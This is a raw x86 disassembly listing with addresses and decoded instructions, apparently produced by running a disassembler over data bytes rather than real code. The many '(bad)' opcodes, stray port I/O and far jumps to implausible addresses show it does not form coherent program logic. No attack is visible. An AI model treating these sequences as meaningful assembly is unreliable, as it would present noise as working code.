  414966:	out    dx,al
  414967:	shl    BYTE PTR [esi],0xf8
  41496a:	add    eax,0xd1b3e1
	...
  4149d3:	add    BYTE PTR [eax],al
  4149d5:	add    BYTE PTR [ebx],cl
  4149d7:	jle    0x4149ab
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	out    0xf1,al
  4149e4:	cmp    dh,dh
  4149e6:	fiadd  WORD PTR [bx+si]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    BYTE PTR [eax-0x773ca788],bh
  4149f3:	inc    ebx
  4149f4:	push   es
  4149f5:	jns    0x4149c7
  4149f7:	int3   
  4149f8:	or     eax,0x172f855a
  4149fd:	idiv   DWORD PTR [esi+0x3a]
  414a00:	js     0x414a57
  414a02:	sbb    ch,bl
  414a04:	jmp    0xbd7c8da1
  414a09:	inc    esp
  414a0a:	inc    esi
  414a0b:	dec    edx
  414a0c:	push   ebp
  414a0d:	fcomp  st(4)
  414a0f:	sbb    BYTE PTR es:[eax+0x53f10ebc],ch
  414a16:	(bad)  
  414a17:	jp     0x414a89
  414a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1a:	xor    DWORD PTR [ecx+0x2f],ebp
  414a1d:	arpl   ax,cx
  414a1f:	pop    edi
  414a20:	(bad)  
  414a21:	repnz in eax,0x9a
  414a24:	shl    DWORD PTR [ebx-0x44],0xd7
  414a28:	xchg   edi,eax
  414a29:	jo     0x414a87
  414a2b:	frstor [edx+0x3b8951d8]
  414a31:	es add al,0xc1
  414a34:	psadbw mm1,mm3
  414a37:	adc    al,BYTE PTR [eax]
  414a39:	xchg   esi,eax
  414a3a:	jge    0x414a62
  414a3c:	into   
  414a3d:	nop
  414a3e:	cmp    bl,ch
  414a40:	dec    di
  414a42:	jmp    0x414a98
  414a44:	dec    esi
  414a45:	leave  
  414a46:	test   DWORD PTR [edi+0x6a961ef8],eax
  414a4c:	cs inc edx
  414a4e:	mov    bh,0xad
  414a50:	pop    es
  414a51:	mov    edi,0x13d059c3
  414a56:	add    cl,cl
  414a58:	test   al,0x44
  414a5a:	jo     0x414a5e
  414a5c:	dec    esi
  414a5d:	mov    al,0x9c
  414a5f:	fldenv [ebp+0x51]
  414a62:	adc    BYTE PTR [ebx-0x401275f1],ah
  414a68:	or     DWORD PTR [edx+ecx*1-0x7f],ebp
  414a6c:	and    al,BYTE PTR ds:0xc640930b
  414a72:	aaa    
  414a73:	add    al,0xa0
  414a75:	fistp  QWORD PTR [ebx]
  414a77:	xchg   ebx,eax
  414a78:	cwde   
  414a79:	call   0x7a799e9c
  414a7e:	mov    ds,WORD PTR [ebp-0x7a91ee9c]
  414a84:	enter  0x3532,0xff
  414a88:	out    0x80,eax
  414a8a:	das    
  414a8b:	sub    BYTE PTR [ebp-0x40],dl
  414a8e:	out    0x22,al
  414a90:	xchg   esp,eax
  414a91:	jae    0x414a6c
  414a93:	test   BYTE PTR [ebx+0x93265bc],ch
  414a99:	inc    ebp
  414a9a:	into   
  414a9b:	shl    DWORD PTR [ecx+0x7745ead5],cl
  414aa1:	or     BYTE PTR [esi],ch
  414aa3:	shl    BYTE PTR [edi+0x5f36cb0],0x6b
  414aaa:	arpl   bp,bx
  414aac:	dec    edi
  414aad:	add    al,0xe2
  414aaf:	ins    DWORD PTR es:[edi],dx
  414ab0:	push   ebp
  414ab1:	arpl   WORD PTR ds:0x394572b9,di
  414ab7:	adc    ch,al
  414ab9:	retf   
  414aba:	xor    eax,DWORD PTR [ebp+0x21893085]
  414ac0:	dec    edx
  414ac1:	out    dx,al
  414ac2:	stos   DWORD PTR es:[edi],eax
  414ac3:	pop    edx
  414ac4:	fstp   QWORD PTR [eax+0x33]
  414ac7:	sub    esp,DWORD PTR [eax-0x658e2354]
  414acd:	xchg   esi,eax
  414ace:	sub    al,0xb4
  414ad0:	test   eax,0xda9ec696
  414ad5:	dec    esi
  414ad6:	push   cs
  414ad7:	sbb    eax,0x374d2999
  414adc:	cdq    
  414add:	pop    esp
  414ade:	inc    ebp
  414adf:	mov    esi,0x8dd06684
  414ae4:	pop    ds
  414ae5:	cli    
  414ae6:	inc    ecx
  414ae7:	sub    DWORD PTR [ecx+0x11],edi
  414aea:	cli    
  414aeb:	jp     0x414a82
  414aed:	push   edx
	...
  414b56:	lahf   
  414b57:	fnstcw WORD PTR [esi]
  414b59:	ss jle 0x414b53
  414b5c:	lahf   
  414b5d:	stc    
  414b5e:	bound  esp,QWORD PTR [ebx+0x182063d9]
  414b64:	sbb    al,0xc8
  414b66:	fild   WORD PTR [bx+si]
  414b69:	add    BYTE PTR [eax],al
  414b6b:	add    DWORD PTR [eax],eax
  414b6d:	add    BYTE PTR [ecx+0x1c],bh
  414b70:	push   ebx
  414b71:	pop    edi
  414b72:	cli    
  414b73:	sub    al,0x78
  414b75:	mov    dl,0x1b
  414b77:	xor    ecx,DWORD PTR [ebx+0x6c6d21c3]
  414b7d:	mov    eax,0x8a38391e
  414b82:	cmp    ebp,0x2
  414b85:	sub    al,0x11
  414b87:	add    eax,0x8f9ab08
  414b8c:	sahf   
  414b8d:	cmp    BYTE PTR [ebx+0x92e8f86],bl
  414b93:	pop    ebx
  414b94:	repz xchg ebp,eax
  414b96:	test   DWORD PTR [edi-0x355e5b22],esi
  414b9c:	mov    ss,WORD PTR [ebx]
  414b9e:	jno    0x414c01
  414ba0:	add    eax,0x20a23c67
  414ba5:	sbb    al,0x7d
  414ba7:	mov    dh,0x19
  414ba9:	and    bl,dl
  414bab:	mov    eax,ds:0x54a04d0f
  414bb0:	adc    eax,0xa258e7a0
  414bb5:	or     al,0x2e
  414bb7:	pop    eax
  414bb8:	test   DWORD PTR [ecx+eiz*8],0x44d81807
  414bbf:	jb     0x414b44
  414bc1:	adc    DWORD PTR [esi],edx
  414bc3:	mov    edx,0x2286411f
  414bc8:	mov    esi,0xe20ef74e
  414bcd:	lods   al,BYTE PTR ds:[esi]
  414bce:	loopne 0x414b9b
  414bd0:	mov    al,0x75
  414bd2:	jne    0x414bb2
  414bd4:	inc    ebp
  414bd5:	fld    DWORD PTR cs:[ebp+0x6033ec99]
  414bdc:	mov    gs,WORD PTR [ecx-0xb]
  414bdf:	popa   
  414be0:	aam    0x20
  414be2:	adc    ecx,eax
  414be4:	pop    es
  414be5:	and    ecx,ebx
  414be7:	cdq    
  414be8:	lods   al,BYTE PTR ds:[esi]
  414be9:	push   esi
  414bea:	or     al,0xde
  414bec:	ror    BYTE PTR [eax],cl
  414bee:	retf   
  414bef:	sbb    dl,BYTE PTR [eax-0x4]
  414bf2:	sub    BYTE PTR [ebx],dl
  414bf4:	nop
  414bf5:	mov    eax,ds:0x31110747
  414bfa:	js     0x414b9c
  414bfc:	outs   dx,BYTE PTR ds:[esi]
  414bfd:	daa    
  414bfe:	std    
  414bff:	sub    eax,0xd331abed
  414c04:	sub    eax,0xe659bc96
  414c09:	js     0x414c73
  414c0b:	push   ds
  414c0c:	or     bl,0x47
  414c0f:	sub    al,0x5e
  414c11:	js     0x414bc5
  414c13:	imul   ecx,DWORD PTR [esp+edx*2-0x54383a3e],0x23
  414c1b:	data16 aaa 
  414c1d:	aaa    
  414c1e:	imul   ebx,DWORD PTR [ebp+eiz*2+0x61ebdb93],0xe
  414c26:	lock pop ebx
  414c28:	jmp    0x414c35
  414c2a:	call   FWORD PTR [ebx]
  414c2c:	test   DWORD PTR [ebx+0x54b9d3e],ebx
  414c32:	ins    BYTE PTR es:[edi],dx
  414c33:	in     eax,0x56
  414c35:	sbb    eax,0x40c6d2fd
  414c3a:	adc    edx,edx
  414c3c:	pop    ebp
  414c3d:	mov    bl,0x1f
  414c3f:	call   0x100d9266
  414c44:	push   ecx
  414c45:	push   edi
  414c46:	imul   ebx,DWORD PTR [edx],0xe9f79f7
  414c4c:	lds    esp,FWORD PTR [esi+eiz*1]
  414c4f:	ins    DWORD PTR es:[edi],dx
  414c50:	push   ecx
  414c51:	mov    edx,0x32eabaaa
  414c56:	push   esi
  414c57:	jecxz  0x414beb
  414c59:	repnz cmp BYTE PTR [eax+0x3f],cl
  414c5d:	bound  edi,QWORD PTR [edx-0x1d]
  414c60:	and    bl,BYTE PTR [ecx]
  414c62:	stos   DWORD PTR es:[edi],eax
  414c63:	cmp    dl,BYTE PTR [eax+0x29]
  414c66:	mov    eax,0x52b85090
  414c6b:	sub    DWORD PTR gs:[eax+eax*1],0x0
	...
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	xor    al,0x64
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    ebx,DWORD PTR cs:[eax]
  414ce3:	cdq    
  414ce4:	clc    
  414ce5:	mov    bh,0x67
  414ce7:	loopne 0x414ce9
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	add    DWORD PTR [eax],eax
  414ced:	add    BYTE PTR [eax],ah
  414cef:	jp     0x414cc8
  414cf1:	fsub   QWORD PTR [edx+0x70]
  414cf4:	pushf  
  414cf5:	pop    esp
  414cf6:	retf   
  414cf7:	in     eax,0x26
  414cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cfa:	mov    edi,esi
  414cfc:	push   ds
  414cfd:	dec    esp
  414cfe:	shr    DWORD PTR [edx+0x17],0xc
  414d02:	mov    al,0xfc
  414d04:	sbb    ebp,DWORD PTR [ebp-0x46a9b19b]
  414d0a:	mov    gs,esp
  414d0c:	out    0x12,al
  414d0e:	sbb    al,0x24
  414d10:	inc    ecx
  414d11:	xchg   esp,eax
  414d12:	scas   al,BYTE PTR es:[edi]
  414d13:	jmp    0xeb29cc3a
  414d18:	mov    al,0x98
  414d1a:	cmovs  esp,DWORD PTR [ecx+0x624f87a6]
  414d21:	sub    eax,ecx
  414d23:	fsub   DWORD PTR [esi]
  414d25:	data16 rcl bh,1
  414d28:	into   
  414d29:	lock (bad) 
  414d2b:	(bad)  
  414d2d:	call   0xbad5dc38
  414d32:	cmp    BYTE PTR [ebp+0x2a],dh
  414d35:	mov    ch,0xaa
  414d37:	push   ss
  414d38:	cld    
  414d39:	dec    ecx
  414d3a:	adc    dl,ch
  414d3c:	inc    ecx
  414d3d:	inc    ecx
  414d3f:	std    
  414d40:	push   ss
  414d41:	mov    ds:0x3e529226,al
  414d46:	xlat   BYTE PTR ds:[ebx]
  414d47:	sub    BYTE PTR [ebp-0x34c8288c],cl
  414d4d:	(bad)  
  414d4f:	inc    eax
  414d50:	pop    ebx
  414d51:	dec    edx
  414d52:	fwait
  414d53:	mov    BYTE PTR [edx],bl
  414d55:	xlat   BYTE PTR ds:[ebx]
  414d56:	dec    ebp
  414d57:	xor    ecx,edi
  414d59:	xchg   BYTE PTR [ebx-0x1d],bh
  414d5c:	jge    0x414dac
  414d5e:	repnz add BYTE PTR [ebp+ebx*1-0x713133b3],cl
  414d66:	pop    edx
  414d67:	jmp    0xe3f5d1a
  414d6c:	data16 (bad) 
  414d6e:	cmp    BYTE PTR [eax],bh
  414d70:	adc    eax,0x5949d4c7
  414d75:	data16 test al,0x7e
  414d78:	cmp    DWORD PTR [ecx-0x65fec602],esi
  414d7e:	ffree  st(6)
  414d80:	icebp  
  414d81:	pop    ss
  414d82:	mov    eax,0xab180f3
  414d87:	(bad)  
  414d88:	ja     0x414de2
  414d8a:	dec    eax
  414d8b:	shr    esp,1
  414d8d:	aad    0x8
  414d8f:	ret    
  414d90:	clc    
  414d91:	jno    0x414d4e
  414d93:	hlt    
  414d94:	push   0x7102a7c5
  414d99:	cld    
  414d9a:	xchg   DWORD PTR [edx+0xdc9e836],ebx
  414da0:	(bad)  
  414da1:	sti    
  414da2:	pop    ecx
  414da3:	or     ah,bh
  414da5:	in     eax,0x14
  414da7:	adc    DWORD PTR [ecx-0x26010302],esi
  414dad:	fsubrp st(6),st
  414daf:	push   ebx
  414db0:	dec    ecx
  414db1:	push   es
  414db2:	rcl    ah,0x79
  414db5:	mov    esi,0xdb7b7315
  414dba:	sub    ebx,DWORD PTR [eax]
  414dbc:	stc    
  414dbd:	ret    
  414dbe:	jmp    0xdc0c:0x7741bfa7
  414dc5:	fisttp WORD PTR [eax+0x55]
  414dc8:	cmp    BYTE PTR [ebx+eax*4],0x17
  414dcc:	add    BYTE PTR [ebx-0x47ec4ce8],dh
  414dd2:	outs   dx,BYTE PTR ds:[esi]
  414dd3:	lods   al,BYTE PTR ds:[esi]
  414dd4:	bound  edi,QWORD PTR [esi]
  414dd6:	sbb    BYTE PTR [ebx],bl
  414dd8:	pushaw 
  414dda:	or     BYTE PTR [ebx],ch
  414ddc:	or     eax,0x7d2ddc29
  414de1:	and    BYTE PTR [ebx+0x44],ah
  414de4:	inc    ecx
  414de5:	sub    eax,0xe0675e0a
  414dea:	out    0x95,eax
  414dec:	scas   eax,DWORD PTR es:[edi]
  414ded:	push   ecx
	...
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x50f87d2f
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [ecx],dl
  414e6f:	pushf  
  414e70:	outs   dx,DWORD PTR ds:[esi]
  414e71:	jbe    0x414e26
  414e73:	mov    es,WORD PTR [ebx]
  414e75:	addr16 inc edx
  414e77:	adc    dl,BYTE PTR [ecx-0x52044c89]
  414e7d:	retf   0xc8f3
  414e80:	arpl   WORD PTR [edx-0x1b],sp
  414e83:	pop    esi
  414e84:	rcr    DWORD PTR [ecx-0x36],0x63
  414e88:	cwde   
  414e89:	loop   0x414ec2
  414e8b:	push   ecx
  414e8c:	fcmovne st,st(5)
  414e8e:	sub    dl,dh
  414e90:	pop    ebx
  414e91:	jnp    0x414eb8
  414e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e94:	mov    ds:0x8cd1ed5,al
  414e99:	mov    eax,ds:0xdd9d6e01
  414e9e:	push   0xfffffff4
  414ea0:	fst    st(6)
  414ea2:	mov    bh,BYTE PTR [ebx-0x1e]
  414ea5:	adc    BYTE PTR [ebx],al
  414ea7:	ja     0x414e35
  414ea9:	xor    ah,BYTE PTR [edx]
  414eab:	push   eax
  414eac:	jnp    0x414e97
  414eae:	aas    
  414eaf:	push   esi
  414eb0:	pop    ebp
  414eb1:	xchg   ecx,eax
  414eb2:	or     eax,DWORD PTR [edi-0x534eab9]
  414eb8:	mov    ebx,0x3011bc68
  414ebd:	cwde   
  414ebe:	pop    ecx
  414ebf:	ss push esp
  414ec1:	or     DWORD PTR [ebx-0x18],0x5af09a3c
  414ec8:	xchg   DWORD PTR [edx],eax
  414eca:	leave  
  414ecb:	and    al,0x8e
  414ecd:	das    
  414ece:	jne    0x414f37
  414ed0:	pop    esp
  414ed1:	mov    eax,ds:0x96d1f7e7
  414ed6:	cld    
  414ed7:	cs fcmovnbe st,st(4)
  414eda:	or     ebx,DWORD PTR [ebp+0x56a25a4f]
  414ee0:	mov    ebx,0xb50e8d70
  414ee5:	xchg   edi,esi
  414ee7:	ins    DWORD PTR es:[edi],dx
  414ee8:	xchg   eax,edx
  414eea:	fiadd  WORD PTR [ebp+0x10368379]
  414ef0:	sbb    eax,ebp
  414ef2:	retf   0xfb2e
  414ef5:	in     al,dx
  414ef6:	call   0xdc16173c
  414efb:	cwde   
  414efc:	cmp    DWORD PTR [edx],edi
  414efe:	fbstp  TBYTE PTR [ecx-0x16]
  414f01:	test   dl,0xee
  414f04:	sbb    eax,0x6737e2b
  414f09:	and    DWORD PTR [ebp-0x50],ecx
  414f0c:	nop
  414f0d:	mov    al,ds:0x6b7a82f2
  414f12:	dec    edi
  414f13:	ret    0x2ca9
  414f16:	leave  
  414f17:	mov    ebp,DWORD PTR [esi-0x8f30a29]
  414f1d:	mov    ch,0x10
  414f1f:	dec    ebp
  414f20:	jmp    0x5c01:0x82451397
  414f27:	cmp    ch,0x9
  414f2a:	mov    esp,DWORD PTR [edx-0x6ad6e5c0]
  414f30:	cli    
  414f31:	(bad)  
  414f32:	nop
  414f33:	(bad)  
  414f34:	lods   eax,DWORD PTR ds:[esi]
  414f35:	gs xor eax,0x63f8ec77
  414f3b:	ja     0x414f46
  414f3d:	outs   dx,DWORD PTR ds:[esi]
  414f3e:	dec    esi
  414f3f:	and    BYTE PTR [eax],ch
  414f41:	(bad)  
  414f42:	dec    esp
  414f43:	dec    esp
  414f44:	push   edi
  414f45:	pop    esi
  414f46:	jbe    0x414f71
  414f48:	repz pushf 
  414f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f4b:	pop    edi
  414f4c:	inc    ecx
  414f4d:	inc    edx
  414f4e:	dec    esp
  414f4f:	loop   0x414fa2
  414f51:	mov    eax,0x5d2d9da7
  414f56:	add    al,0x38
  414f58:	adc    BYTE PTR [ecx+esi*1],0xc3
  414f5c:	and    eax,0x61bd47d4
  414f61:	cmp    esp,DWORD PTR [esi]
  414f63:	xchg   BYTE PTR [ebx-0x4d],bl
  414f66:	das    
  414f67:	push   ss
  414f68:	stos   BYTE PTR es:[edi],al
  414f69:	ins    BYTE PTR es:[edi],dx
  414f6a:	call   0x0:0x3e4664
	...
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0x2b08f574
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	jle    0x414ffd
  414ff0:	les    eax,FWORD PTR ds:0x487f661e
  414ff6:	or     ebx,DWORD PTR [ebp+0x1f]
  414ff9:	jge    0x41501f
  414ffb:	xchg   esi,eax
  414ffc:	jecxz  0x414fcd
  414ffe:	jmp    0x43511029
  415003:	and    ebx,esp
  415005:	(bad)  
  415006:	div    BYTE PTR [ebp-0x440382a7]
  41500c:	aas    
  41500d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41500e:	sbb    ebp,ecx
  415010:	cmp    esi,DWORD PTR [ecx+0x54]
  415013:	es push ss
  415015:	xor    ah,BYTE PTR [edx]
  415017:	mov    WORD PTR [ecx-0x28],?
  41501a:	icebp  
  41501b:	loope  0x414fad
  41501d:	mov    eax,ds:0xb9ccd66f
  415022:	push   ebp
  415023:	push   ss
  415024:	mov    WORD PTR [ebx+edx*4],es
  415027:	retf   0xe66f
  41502a:	xor    DWORD PTR [edi],esp
  41502c:	push   0xffffffdb
  41502e:	sahf   
  41502f:	mov    DWORD PTR [edx+0x671d58b1],edx
  415035:	or     al,0x58
  415037:	jge    0x415061
  415039:	mov    eax,0x174e47a5
  41503e:	mov    ebp,0x5b701c48
  415043:	stos   BYTE PTR es:[edi],al
  415044:	retf   
  415045:	sub    DWORD PTR [esi],ebp
  415047:	adc    esp,ecx
  415049:	cli    
  41504a:	(bad)  
  41504b:	cmp    BYTE PTR [eax],dl
  41504d:	fsubr  DWORD PTR [ecx]
  41504f:	and    ebp,DWORD PTR ds:0x56ad7e11
  415055:	iret   
  415056:	cwde   
  415057:	mov    al,0x7
  415059:	sbb    ebx,DWORD PTR [esi+0x63]
  41505c:	jnp    0x41509a
  41505e:	push   ebp
  41505f:	inc    edi
  415060:	xchg   esi,eax
  415061:	xor    al,0x7d
  415063:	inc    ebx
  415064:	lods   eax,DWORD PTR ds:[esi]
  415065:	fcom   st(6)
  415067:	cmp    esp,edi
  415069:	fnstsw WORD PTR [edx+0x22953b98]
  41506f:	arpl   di,cx
  415071:	inc    edi
  415072:	js     0x4150b3
  415074:	mov    BYTE PTR [edx+ebp*8-0x32],bh
  415078:	outs   dx,BYTE PTR ds:[esi]
  415079:	je     0x41501a
  41507b:	gs or  eax,0xce74dac
  415081:	cmp    edi,DWORD PTR [edi-0x4]
  415084:	xchg   esi,eax
  415085:	fs xor eax,0xa9b54f9b
  41508b:	push   ebp
  41508c:	mov    ebx,0x2405c7dd
  415091:	xlat   BYTE PTR ds:[ebx]
  415092:	adc    DWORD PTR [ecx+0x713081f7],ebp
  415098:	xchg   edi,eax
  415099:	rcr    DWORD PTR [edi+0x70],cl
  41509c:	stos   DWORD PTR es:[edi],eax
  41509d:	jg     0x41510c
  41509f:	xor    edx,DWORD PTR [esi]
  4150a1:	jno    0x4150bd
  4150a3:	pop    esp
  4150a4:	es mov dl,0xf7
  4150a7:	mov    ch,0x9d
  4150a9:	stos   DWORD PTR es:[edi],eax
  4150aa:	mov    eax,0x5c0c639d
  4150af:	imul   edx,DWORD PTR [edx-0x26],0x1ded9c72
  4150b6:	mov    bh,0xb6
  4150b8:	cmp    ecx,DWORD PTR ds:0x239cf12
  4150be:	inc    ecx
  4150bf:	int3   
  4150c0:	xchg   edi,eax
  4150c1:	jo     0x41510b
  4150c3:	je     0x415074
  4150c5:	outs   dx,DWORD PTR ds:[esi]
  4150c6:	mov    ch,0x81
  4150c8:	push   0x1e1d5cf0
  4150cd:	loopne 0x4150d2
  4150cf:	fcmovu st,st(3)
  4150d1:	es push edi
  4150d3:	and    eax,0xed6bf43d
  4150d8:	inc    ebp
  4150d9:	ret    
  4150da:	push   ecx
  4150db:	jge    0x41512f
  4150dd:	or     esi,esp
  4150df:	sub    BYTE PTR ds:0xeb0e6403,ah
  4150e5:	pop    ebx
  4150e6:	xor    ecx,DWORD PTR [eax+0x67]
  4150e9:	(bad)  
  4150ea:	(bad)  
  4150eb:	loopne 0x41510b
  4150ed:	xchg   esi,eax
	...
  415156:	jnp    0x41515a
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0xf488fc2d
  415164:	scas   al,BYTE PTR es:[edi]
  415165:	push   ebx
  415166:	jcxz   0x415169
  415169:	add    BYTE PTR [eax],al
  41516b:	add    DWORD PTR [eax],eax
  41516d:	add    BYTE PTR [edi+0x5f],ch
  415170:	int3   
  415171:	xor    cl,BYTE PTR [ecx+0x7c8894f8]
  415177:	mov    edi,0xc0077021
  41517c:	icebp  
  41517d:	or     edi,DWORD PTR [eax]
  41517f:	mov    eax,ds:0xec3de3df
  415184:	mov    DWORD PTR [ecx+0x6c],ecx
  415187:	jecxz  0x4151d0
  415189:	cmp    DWORD PTR [eax-0x2393847b],0x6d98592c
  415193:	pop    ebp
  415194:	add    BYTE PTR [eax],bl
  415196:	scas   eax,DWORD PTR es:[edi]
  415197:	mov    ds:0xedc7322e,al
  41519c:	clc    
  41519d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41519e:	lahf   
  41519f:	ret    0x3d57
  4151a2:	mov    eax,ds:0xee46f0d8
  4151a7:	pop    ecx
  4151a8:	cs jno 0x41520c
  4151ab:	pop    ecx
  4151ac:	push   ebp
  4151ad:	dec    ecx
  4151ae:	push   ds
  4151af:	test   al,0xa4
  4151b1:	xchg   esi,eax
  4151b2:	adc    DWORD PTR [edx+0x24c89f2d],eax
  4151b8:	cmp    BYTE PTR [ecx+0x41],ah
  4151bb:	push   edi
  4151bc:	pop    ebx
  4151bd:	das    
  4151be:	ins    DWORD PTR es:[edi],dx
  4151bf:	mov    edi,0xd0df1561
  4151c4:	inc    esi
  4151c5:	jp     0x4151a8
  4151c7:	cmp    DWORD PTR [ecx+0x64a07814],ebp
  4151cd:	xor    BYTE PTR [edi],0xfc
  4151d0:	shl    DWORD PTR [esi+0x3c],0xac
  4151d4:	je     0x4151f8
  4151d6:	cmp    cl,BYTE PTR [eax+0x242ae89e]
  4151dc:	add    esp,0x9e818515
  4151e2:	sub    DWORD PTR [edi-0x52d09bc8],eax
  4151e8:	stos   BYTE PTR es:[edi],al
  4151e9:	lea    edx,ds:0x7d919616
  4151ef:	or     dl,BYTE PTR [ebx+0x7f9e1596]
  4151f5:	dec    ecx
  4151f6:	retf   
  4151f7:	jbe    0x4151b7
  4151f9:	fst    DWORD PTR [esi]
  4151fb:	push   0x61f941b3
  415200:	sbb    edi,esp
  415202:	mov    ebp,0x968cb334
  415207:	retf   0xdefd
  41520a:	out    0xa2,al
  41520c:	lods   eax,DWORD PTR ds:[esi]
  41520d:	mov    ch,0xe5
  41520f:	dec    ebx
  415210:	dec    ecx
  415211:	dec    ecx
  415212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415213:	(bad)  
  415214:	sbb    BYTE PTR [ebp+0x36],dl
  415217:	push   eax
  415218:	xchg   ebp,eax
  415219:	jbe    0x415280
  41521b:	inc    esi
  41521c:	test   eax,0xfadea962
  415221:	add    bh,BYTE PTR [ecx]
  415223:	enter  0x372,0x2d
  415227:	cmp    bl,BYTE PTR [edi-0x55e30a06]
  41522d:	mul    DWORD PTR [edx-0x42fc9cf3]
  415233:	sub    eax,0x9d3b15f6
  415238:	repz fisttp WORD PTR [ecx-0x1fc8f30a]
  41523f:	ins    DWORD PTR es:[edi],dx
  415240:	adc    eax,0xf4111b43
  415245:	xor    DWORD PTR ds:0xcf90c71,0xffffff95
  41524c:	mov    ebp,0x8a236f57
  415251:	push   ecx
  415252:	retf   
  415253:	popf   
  415254:	mov    edx,0xc6af661c
  415259:	push   cs
  41525a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41525b:	(bad)  
  41525d:	pop    eax
  41525e:	add    al,0x64
  415260:	sar    DWORD PTR [esi+0x7e],cl
  415263:	xor    al,0xcc
  415265:	(bad)  ds:0x15f18bb9
  41526b:	xor    DWORD PTR [ebx],eax
  41526d:	arpl   WORD PTR [eax],ax
	...
  4152d3:	add    BYTE PTR [eax],al
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0xc998dd0b
  4152e5:	push   edx
  4152e6:	addr16 in al,0x0
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	add    DWORD PTR [eax],eax
  4152ed:	add    ch,ch
  4152ef:	mov    ah,0x27
  4152f1:	arpl   WORD PTR ds:0xba3e0e75,bx
  4152f7:	mov    esp,tr2
  4152fa:	out    dx,al
  4152fb:	adc    cl,dl
  4152fd:	mov    eax,0xfee4148b
  415302:	sub    BYTE PTR [esp+esi*1-0x47785058],bl
  415309:	sub    eax,0x132df9b5
  41530e:	push   cs
  41530f:	ss sub eax,0x3321e82d
  415315:	cmp    BYTE PTR [edi],dh
  415317:	push   ebp
  415318:	mov    ebp,0xe7e2b842
  41531d:	mov    cl,al
  41531f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415321:	push   ss
  415322:	mov    al,ds:0x57d9bac6
  415327:	data16 ds ja 0x4152f2
  41532b:	(bad)
  41532e:	jmp    0x1c04:0xc000eeed
  415335:	jbe    0x41537d
  415337:	push   0x19db814b
  41533c:	mov    ecx,0x1382c880
  415341:	jge    0x41537f
  415343:	repz adc ch,BYTE PTR [eax+0x62]
  415347:	mov    edx,0x22862169
  41534c:	jno    0x415390
  41534e:	aad    0x4f
  415350:	fmul   st(4),st
  415352:	mov    ecx,DWORD PTR [ebp+0x3c1854ff]
  415358:	(bad)  
  415359:	into   
  41535a:	xor    BYTE PTR [esi-0x774e5c04],cl
  415360:	xchg   ebp,eax
  415361:	test   edx,edx
  415363:	stos   BYTE PTR es:[edi],al
  415364:	and    ebx,DWORD PTR [eax]
  415366:	test   eax,0x3b3ca9e3
  41536c:	sti    
  41536d:	inc    ebp
  41536e:	or     edx,DWORD PTR [edi-0x6]
  415371:	(bad)  [ecx-0x721c74dd]
  415377:	jo     0x415317
  415379:	dec    edx
  41537a:	in     al,dx
  41537b:	jmp    0xe4bc95b3
  415380:	cmp    edi,DWORD PTR [esi-0x1b21849b]
  415386:	sbb    ebp,DWORD PTR [edx+eax*4-0x53]
  41538a:	rol    dl,0x19
  41538d:	mov    eax,ds:0x50a5247
  415392:	inc    esp
  415393:	push   ebx
  415394:	arpl   WORD PTR [esi],sp
  415396:	sbb    ah,BYTE PTR [ebp-0x756141a]
  41539c:	in     al,0x60
  41539e:	jecxz  0x4153fc
  4153a0:	popf   
  4153a1:	jecxz  0x415413
  4153a3:	or     al,0x27
  4153a5:	(bad)  
  4153a6:	les    esp,FWORD PTR [ebp+0x59]
  4153a9:	popa   
  4153aa:	sub    al,0x4f
  4153ac:	cmc    
  4153ad:	idiv   DWORD PTR [bx-0x3e75]
  4153b2:	push   ds
  4153b3:	cwde   
  4153b4:	xor    eax,0xddb2ee7e
  4153b9:	add    eax,0xc325e05f
  4153be:	sahf   
  4153bf:	out    dx,eax
  4153c0:	leave  
  4153c1:	shr    BYTE PTR [eax+ecx*2+0xb],cl
  4153c5:	push   edi
  4153c6:	xor    al,0x51
  4153c8:	pop    eax
  4153c9:	adc    dh,BYTE PTR [ecx]
  4153cb:	and    eax,0x1a66dde9
  4153d1:	(bad)  
  4153d2:	stc    
  4153d3:	in     al,0xf0
  4153d5:	mov    ebp,0xd2244f2
  4153da:	sbb    DWORD PTR [edi+0x0],edx
  4153dd:	dec    esi
  4153de:	pop    edi
  4153df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153e0:	fwait
  4153e1:	shl    ebp,1
  4153e3:	icebp  
  4153e4:	scas   al,BYTE PTR es:[edi]
